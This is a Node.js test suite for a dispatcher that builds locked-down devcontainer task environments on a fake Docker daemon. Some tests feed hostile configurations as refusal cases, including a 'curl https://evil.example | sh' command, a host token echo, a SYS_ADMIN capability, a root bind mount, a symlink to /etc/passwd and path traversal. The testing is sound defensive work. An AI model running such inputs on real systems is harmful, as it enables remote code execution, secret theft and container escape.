// A run's task environment, in ADR-0062's order (incident-platform backlog #0-277 AC3, AC5, AC6, AC9, AC10, AC11,
// AC13), on the fake daemon and a generic product: a killed run's leftovers are swept and the run starts; the task
// container is made from a fresh clone of the base, from the override, holds /opt/factory read-only and no mount of
// the dispatcher's state, its image recorded by ID; a rollback seen at either check stops the run, and the second
// one leaves the rollback's objects alone; a refusal while setting up the container ends the task BLOCKED, and the
// daemon is swept at the end either way; a call past its limit leaves no process and blocks the task; the task's
// commits leave as a bundle on stdout into the dispatcher's own directory.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { mkdir, readdir, readFile, stat, writeFile } from 'node:fs/promises';
import { join } from 'node:path';

import { RollbackRunningError } from '../src/container/daemon.mjs';
import { inTaskEnvironment, setUpTaskContainer } from '../src/container/environment.mjs';
import { bundleFromTask } from '../src/container/task-bundle.mjs';
import { CallTimeoutError, callInTask, execInTask, readTaskConfig } from '../src/container/task-container.mjs';
import { TASK_CONFIG_LIST, buildOverride } from '../src/container/task-config.mjs';
import { initBare } from '../src/git/config-allowlist.mjs';
import { loadBundle } from '../src/git/bundle.mjs';
import { createTask, loadTask, updateTask } from '../src/state/tasks.mjs';
import { makeFakeDaemon, plantedContainer } from '../testing/fake-daemon.mjs';
import { REAL_GIT, git } from '../testing/git-fixtures.mjs';
import { HELPER_IMAGE, makeStateDir } from '../testing/state-dir.mjs';
import {
  CONFIG, CONFIG_PATH, FEATURE, FEATURE_DIGEST, FEATURE_REF, makeTaskProduct,
} from '../testing/task-product.mjs';

const root = await makeStateDir();
after(root.remove);
let n = 0;
const RUN_ID = '20261120T101500Z-3f9a1c';
const OLD_RUN = '20261119T090000Z-0a0b0c';

async function setUp({ product: productOptions, initial } = {}) {
  n += 1;
  const dir = join(root.dir, `case-${n}`);
  await mkdir(dir);
  const stateDir = join(dir, 'state');
  await mkdir(stateDir, { mode: 0o700 });
  const product = await makeTaskProduct(dir, productOptions);
  const fake = makeFakeDaemon(dir, initial);
  const options = { stateDir, repoDir: product.repoDir, adapter: { taskImage: CONFIG_PATH }, helperImage: HELPER_IMAGE,
    sudo: fake.sudo, git: REAL_GIT };
  return { dir, stateDir, product, fake, options };
}

const isEmpty = async (fake) => {
  const state = fake.read();
  assert.deepEqual(state.containers.map((c) => c.name), []);
  assert.deepEqual(state.networks.map((x) => x.name).sort(), ['bridge', 'host', 'none']);
  assert.ok(state.volumes.every((v) => v.name === 'factory-dispatcher-m2'), state.volumes.map((v) => v.name).join());
  assert.deepEqual(await readdir(fake.tasks), []);
};

const steps = (fake) => fake.calls().map((c) => (c.program === 'devcontainer' ? `devcontainer ${c.args[0]}`
  : [c.args[0], ['network', 'volume', 'container', 'image'].includes(c.args[0]) ? c.args[1] : null,
    c.args.includes('label=factory.rollback') ? '(rollback)' : null].filter(Boolean).join(' ')));

test('AC13, AC3, AC5: after a killed run, its leftovers are swept and the run starts; the task container is made from '
  + 'a fresh clone, holds /opt/factory read-only and nothing of the state, its image recorded; all removed at the end',
async () => {
  const { stateDir, product, fake, options } = await setUp({ initial: {
    containers: [plantedContainer({ name: 'task-old', labels: { 'factory.task': OLD_RUN } }),
      plantedContainer({ name: 'testcontainers-kafka' })],
    volumes: [{ name: `factory-task-${OLD_RUN}-claude`, labels: { 'factory.task': OLD_RUN } }],
  } });
  await mkdir(join(fake.tasks, OLD_RUN, 'w', '.git'), { recursive: true });
  let seen;
  const { result, swept } = await inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, sudo: fake.sudo },
    async () => {
      const ready = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
      const state = fake.read();
      const container = state.containers.find((c) => c.labels['factory.task'] === RUN_ID);
      seen = { ready, container, override: JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8')),
        head: git(join(fake.tasks, RUN_ID, 'w'), ['rev-parse', 'HEAD']), networks: state.networks.map((x) => x.name),
        volumes: state.volumes.map((v) => v.name) };
      return ready.task;
    });
  assert.deepEqual(swept.containers.sort(), ['task-old', 'testcontainers-kafka']);
  assert.equal(seen.ready.task.status, 'running', seen.ready.task.reason);
  assert.equal(seen.head, product.base, 'the clone is the base');
  assert.equal(result.baseSha, product.base);
  assert.equal(result.imageId, seen.container.image, 'the image recorded by its ID');
  assert.match(result.imageId, /^sha256:[0-9a-f]{64}$/);
  assert.deepEqual(await loadTask(stateDir, RUN_ID), result);
  const carried = await readTaskConfig({ repoDir: product.repoDir, base: product.base, path: CONFIG_PATH, git: REAL_GIT });
  assert.deepEqual(seen.override, buildOverride(carried, { runId: RUN_ID }));
  const mounts = seen.container.mounts.map((m) => `${m.Type} ${m.Name ?? m.Source} ${m.Destination} ${m.RW ? 'rw' : 'ro'}`);
  assert.deepEqual(mounts.sort(), [
    `bind /home/factory/tasks/${RUN_ID}/w /workspace rw`,
    'bind /opt/factory-checkout /opt/factory ro',
    'bind /var/run/docker.sock /var/run/docker-host.sock rw',
    `volume factory-task-${RUN_ID}-claude /home/dev/.claude rw`,
    'volume factory-dispatcher-m2 /home/dev/.m2 rw',
  ].sort());
  assert.ok(mounts.every((m) => !m.includes(stateDir)), 'AC10: nothing of the dispatcher\'s state is mounted');
  assert.ok(seen.networks.includes(`factory-task-${RUN_ID}`));
  assert.deepEqual(seen.volumes.sort(), ['factory-dispatcher-m2', `factory-task-${RUN_ID}-claude`]);
  const order = steps(fake);
  const first = (s, from = 0) => order.indexOf(s, from);
  const network = first('network create');
  assert.equal(order[0], 'ps (rollback)', 'the first check, before anything');
  assert.ok(first('rm') < network && first('run') < network, 'the sweep before the run is visible');
  assert.equal(order[network + 1], 'ps (rollback)', 'the second check right after the network');
  assert.ok(network < first('devcontainer up'), 'and before the task container');
  assert.ok(first('exec') > first('image inspect'), 'the probe of timeout after the checks');
  assert.ok(first('rm', first('devcontainer up')) > 0, 'the sweep at the end');
  await isEmpty(fake);
});

test('AC13: a rollback starting while the run builds is seen by the second check: the run stops, removing only its '
  + 'own objects', async () => {
  const rollback = plantedContainer({ name: 'rollback', labels: { 'factory.rollback': '1' },
    volumes: ['incident-platform-gh', 'incident-platform-claude'] });
  const { fake } = await setUp({ initial: {
    volumes: [{ name: 'incident-platform-gh', labels: {} }, { name: 'incident-platform-claude', labels: {} }],
  } });
  let inside = false;
  const env = { runId: RUN_ID, helperImage: HELPER_IMAGE, sudo: fake.sudo };
  fake.update((s) => {
    s.volumes = [];
    s.scenario.after = { 'network create': [rollback] };
  });
  await assert.rejects(inTaskEnvironment(env, async () => { inside = true; }), (error) => {
    assert.ok(error instanceof RollbackRunningError);
    assert.match(error.message, /^the run is refused after its network was made: a running container carries factory\.rollback: rollback/);
    return true;
  });
  assert.equal(inside, false, 'no task container is made');
  const state = fake.read();
  assert.deepEqual(state.containers.map((c) => [c.name, c.running]), [['rollback', true]], 'the rollback is not swept');
  assert.ok(!state.networks.some((x) => x.name === `factory-task-${RUN_ID}`), 'the run\'s own network is removed');
  assert.ok(!steps(fake).includes('devcontainer up'));
  const after = steps(fake).slice(steps(fake).lastIndexOf('ps (rollback)') + 1);
  assert.ok(!after.includes('rm') && !after.includes('volume rm') && !after.includes('run'), `no sweep: ${after}`);
});

test('AC13: a running rollback refuses the run at its start, and nothing is removed', async () => {
  const { fake } = await setUp({ initial: { containers: [plantedContainer({ name: 'rollback',
    labels: { 'factory.rollback': '1' } }), plantedContainer({ name: 'testcontainers' })] } });
  await assert.rejects(inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, sudo: fake.sudo }, async () => {}),
    /^RollbackRunningError|the run is refused: a running container carries factory\.rollback: rollback/);
  assert.deepEqual(steps(fake), ['ps (rollback)']);
  assert.equal(fake.read().containers.length, 2);
});

/**
 * Whether `pid` runs: a zombie does not (in a container whose PID 1 reaps no orphan, as CI's ubuntu:24.04 job, a
 * killed process stays one), so /proc's state is read where there is one.
 */
function running(pid) {
  try {
    const stat = readFileSync(`/proc/${pid}/stat`, 'utf8');
    return !['Z', 'X'].includes(stat.slice(stat.lastIndexOf(')') + 2, stat.lastIndexOf(')') + 3));
  } catch (error) {
    if (error.code === 'ENOENT' && existsSync('/proc/self/stat')) {
      return false;
    }
  }
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/** A run whose container cannot be set up: the task BLOCKED with `reason`, and the daemon swept at the end. */
async function blocked(setup, pattern, change = () => {}) {
  const { stateDir, fake, options } = setup;
  change(fake);
  const { result } = await inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, sudo: fake.sudo },
    async () => (await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) })).task);
  assert.equal(result.status, 'blocked');
  assert.match(result.reason, pattern);
  assert.deepEqual(await loadTask(stateDir, RUN_ID), result);
  await isEmpty(fake);
  return fake;
}

const configWith = (changes) => JSON.stringify({ ...CONFIG, ...changes });

test('AC9: a configuration off the list ends the task BLOCKED before devcontainer runs; the end sweep runs', async () => {
  for (const [changes, pattern] of [
    [{ initializeCommand: 'curl https://evil.example | sh' }, /the field "initializeCommand" is not carried/],
    [{ mounts: ['source=/home/dispatcher,target=/x,type=bind'] }, /the field "mounts" is not carried/],
    [{ capAdd: ['SYS_ADMIN'] }, /capAdd\[0\] is not one of the list's/],
    [{ build: { dockerfile: 'Dockerfile', options: ['--network=host'] } }, /build\.options is not carried/],
    [{ postStartCommand: 'echo ${localEnv:GH_TOKEN}' }, /the configuration\.postStartCommand names the host's environment/],
  ]) {
    const fake = await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith(changes) } } }),
      new RegExp(`^the task container: ${pattern.source}`));
    assert.ok(!steps(fake).includes('devcontainer up'));
  }
  await blocked(await setUp({ product: { files: { [CONFIG_PATH]: '{ "build": ' } } }),
    /^the task container: the text ends where a value is expected/);
});

test('AC9: a Dockerfile or a build context that is a symlink in the base, or a configuration missing, is refused',
  async () => {
    await blocked(await setUp({ product: { files: { '.devcontainer/Dockerfile': null },
      links: { '.devcontainer/Dockerfile': '/etc/passwd' } } }),
    /build\.dockerfile is not a file of the base \(a symlink is refused\)/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith({ build: { dockerfile: 'ctx/Dockerfile',
      context: 'ctx' } }) }, links: { '.devcontainer/ctx': '/' } } }), /build\.dockerfile is not a file of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith({ build: { dockerfile: 'Dockerfile',
      context: 'ctx' } }) }, links: { '.devcontainer/ctx': '/' } } }), /build\.context is not a directory of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: null, 'x.json': '{}' } } }),
      /the task configuration \.devcontainer\/task\.json is not a file of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: null }, links: { [CONFIG_PATH]: '/etc/x.json' } } }),
      /is not a file of the base \(a symlink is refused\)/);
    const setup = await setUp();
    for (const taskImage of ['-x.json', '../x.json', '.devcontainer/../../x.json', '/etc/x.json', 'x.yaml', './x.json']) {
      await assert.rejects(readTaskConfig({ repoDir: setup.product.repoDir, base: setup.product.base, path: taskImage,
        git: REAL_GIT }), /taskImage must be a relative path to a \.json in the product, not starting with -/);
    }
  });

test('AC9, AC3: the built image\'s metadata off the list, a mount, privilege or capability the dispatcher did not ask '
  + 'for, or a failed up, end the task BLOCKED', async () => {
  await blocked(await setUp(), /devcontainer\.metadata\[0\], the feature .* is not what the feature declares/, (fake) => {
    fake.update((s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{
      id: 'ghcr.io/devcontainers/features/docker-outside-of-docker:1', entrypoint: '/usr/local/share/docker-init.sh',
      securityOpt: ['label=disable'], privileged: true,
      mounts: [{ source: '/var/run/docker.sock', target: '/var/run/docker-host.sock', type: 'bind' }] }]) }; });
  });
  await blocked(await setUp(), /devcontainer\.metadata\[2\]\.mounts is not on the list/, (fake) => {
    fake.update((s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{ id: FEATURE_REF,
      ...TASK_CONFIG_LIST.features[FEATURE].digests[FEATURE_DIGEST].metadata }, { remoteUser: 'dev' },
    { mounts: ['type=bind,source=/,target=/host'] }]) }; });
  });
  await blocked(await setUp(), /the task container's mounts are not the dispatcher's: unexpected at \/state/, (fake) => {
    fake.update((s) => { s.scenario.extraMounts = [{ Type: 'bind', Source: '/srv/state', Destination: '/state', RW: true }]; });
  });
  await blocked(await setUp(), /the task container is privileged/, (fake) => {
    fake.update((s) => { s.scenario.privileged = true; });
  });
  await blocked(await setUp(), /devcontainer up failed \(exit 1\): devcontainer up: failed by the scenario/, (fake) => {
    fake.update((s) => { s.scenario.upFails = true; });
  });
  await blocked(await setUp(), /the work directory of .* could not be made/, (fake) => {
    fake.update((s) => { s.scenario.helperFails = 'clone'; });
  });
});

test('AC5: a task resumed runs a container of the image it recorded, never one it builds again; another image is '
  + 'refused', async () => {
  const setup = await setUp();
  const { stateDir, fake, options } = setup;
  const imageId = `sha256:${'c'.repeat(64)}`;
  const label = { 'devcontainer.metadata': JSON.stringify([{ id: FEATURE_REF, ...TASK_CONFIG_LIST.features[FEATURE]
    .digests[FEATURE_DIGEST].metadata }, { remoteUser: 'dev' }]) };
  fake.update((s) => { s.images[imageId] = { labels: label }; });
  const task = await updateTask(stateDir, await createTask(stateDir, { runId: RUN_ID }), { imageId });
  const ready = await setUpTaskContainer({ ...options, task });
  assert.equal(ready.task.status, 'running', ready.task.reason);
  assert.equal(ready.task.imageId, imageId);
  const override = JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8'));
  assert.equal(override.image, imageId);
  assert.equal(override.build, undefined);
  const other = await setUp();
  other.fake.update((s) => { s.images[imageId] = { labels: label }; s.scenario.runImage = `sha256:${'d'.repeat(64)}`; });
  const resumed = await updateTask(other.stateDir, await createTask(other.stateDir, { runId: RUN_ID }), { imageId });
  const refused = await setUpTaskContainer({ ...other.options, task: resumed });
  assert.equal(refused.task.status, 'blocked');
  assert.match(refused.task.reason, /runs sha256:d{64}, not the image recorded for the task, sha256:c{64}/);
});

test('AC11: a call that ignores SIGTERM is killed after its grace, leaves no process, and blocks the task',
  { timeout: 20_000 }, async () => {
    const { stateDir, fake, options } = await setUp();
    const { task, container } = await setUpTaskContainer({ ...options,
      task: await createTask(stateDir, { runId: RUN_ID }) });
    const work = join(fake.tasks, RUN_ID, 'w');
    const left = await callInTask({ stateDir, task, container, sudo: fake.sudo, limitS: 1, graceS: 1,
      args: ['sh', '-c', "trap '' TERM; echo $$ > pid; while :; do sleep 1; done"] });
    assert.equal(left.result, null);
    assert.equal(left.task.status, 'blocked');
    assert.match(left.task.reason, /^the call sh in the task container ran past 1 s \(timeout's exit 137\): its processes were ended$/);
    assert.deepEqual(await loadTask(stateDir, RUN_ID), left.task);
    const pid = Number((await readFile(join(work, 'pid'), 'utf8')).trim());
    assert.equal(running(pid), false, 'no process is left');
    assert.ok(fake.calls().some((c) => c.args[0] === 'kill'), 'the task\'s containers killed by their label');
    const exec = fake.calls().find((c) => c.args[0] === 'exec' && c.args.includes('sh'));
    assert.deepEqual(exec.args.slice(0, 6), ['exec', '-i', '--user', 'dev', '-w', '/workspace']);
    assert.deepEqual(exec.args.slice(7, 13), ['timeout', '-s', 'TERM', '-k', '1s', '1s']);
  });

test('AC11: a call whose CLI hangs, an orphan holding its output, is ended by the dispatcher\'s own timer',
  { timeout: 20_000 }, async () => {
    const { stateDir, fake, options } = await setUp();
    const { container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
    fake.update((s) => { s.scenario.execHangs = true; });
    await assert.rejects(execInTask({ container, sudo: fake.sudo, limitS: 1, graceS: 1, marginS: 1, args: ['sleep', '9'] }),
      (error) => {
        assert.ok(error instanceof CallTimeoutError);
        assert.match(error.message, /ran past 1 s and was killed: docker exec ran past 3000 ms: stopped/);
        return true;
      });
    const orphans = fake.read().containers.find((c) => c.id === container.id);
    assert.equal(orphans.running, false, 'killed by the label');
    assert.deepEqual(orphans.pids, []);
    await assert.rejects(execInTask({ container, args: ['x'], limitS: 0 }), TypeError);
    await assert.rejects(execInTask({ container, sudo: fake.sudo, args: ['x'], limitS: 1, env: { 'A B': 'x' } }),
      /is not a variable's name/);
  });

test('AC6: the task\'s commits leave as git bundle create - on exec\'s stdout, into the dispatcher\'s own directory, '
  + 'and the bundle reader takes them', async () => {
  const { stateDir, product, fake, options } = await setUp();
  const { container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
  const work = join(fake.tasks, RUN_ID, 'w');
  await writeFile(join(work, 'change'), 'a task\'s change\n');
  git(work, ['add', 'change']);
  git(work, ['commit', '-q', '-m', 'a task\'s commit']);
  const sha = git(work, ['rev-parse', 'HEAD']);
  const { path, bundle } = await bundleFromTask({ stateDir, container, prerequisite: product.base,
    ref: 'refs/heads/base', sudo: fake.sudo });
  assert.ok(path.startsWith(join(stateDir, 'tasks', RUN_ID, 'bundles') + '/'));
  assert.equal((await stat(path)).mode & 0o777, 0o600);
  assert.deepEqual(await readFile(path), bundle);
  const exec = fake.calls().filter((c) => c.args[0] === 'exec').at(-1);
  assert.deepEqual(exec.args.slice(-7), ['git', '-c', 'core.hooksPath=/dev/null', '-c', 'core.fsmonitor=', 'bundle',
    'create', '-', `${product.base}..refs/heads/base`].slice(-7));
  const repo = join(stateDir, 'tasks', RUN_ID, 'check.git');
  await initBare(join(stateDir, 'tasks', RUN_ID), repo, { git: REAL_GIT });
  await mkdir(join(repo, 'objects', 'info'), { recursive: true });
  await writeFile(join(repo, 'objects', 'info', 'alternates'), `${join(product.repoDir, 'objects')}\n`);
  await loadBundle({ gitDir: repo, bundle, prerequisite: product.base, ref: { sha, name: 'refs/heads/base' }, git: REAL_GIT });
  for (const bad of [{ prerequisite: 'x' }, { ref: 'main' }, { ref: 'refs/heads/../x' }, { ref: '-x' }]) {
    await assert.rejects(bundleFromTask({ stateDir, container, prerequisite: product.base, ref: 'refs/heads/base',
      sudo: fake.sudo, ...bad }), TypeError);
  }
});
